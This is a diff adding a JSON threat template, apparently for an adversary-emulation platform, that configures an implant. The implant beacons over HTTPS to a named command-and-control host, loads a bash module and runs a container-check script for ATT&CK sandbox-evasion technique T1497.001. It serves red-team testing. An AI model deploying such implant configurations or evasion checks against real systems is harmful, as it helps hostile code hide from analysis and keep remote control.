@@ -1,0 +1,39 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Check if implant is running inside a container, cluster, or virtualized environment.",
+        "display_name": "T1497_001_Virtualization_Sandbox_Evasion_SystemChecks",
+        "name": "T1497_001_Virtualization_Sandbox_Evasion_SystemChecks",
+        "operating_system_name": "linux",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"brandon37.scythe.services:443\",\"--secure\":true,\"--multipart\":10240}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "scythe.ubash",
+                "request": "--load scythe.ubash",
+                "type": "message"
+            },
+            "2": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Check if implant is running in a container"
+            },
+            "3": {
+                "depends_on": "5bab5be0-a182-11ec-992e-6fb98c417f58",
+                "module": "scythe.ubash",
+                "request": "--filename VFS:/shared/utils/container_check.sh",
+                "rtags": [
+                    "att&ck-technique:T1497",
+                    "att&ck-technique:T1497.001"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
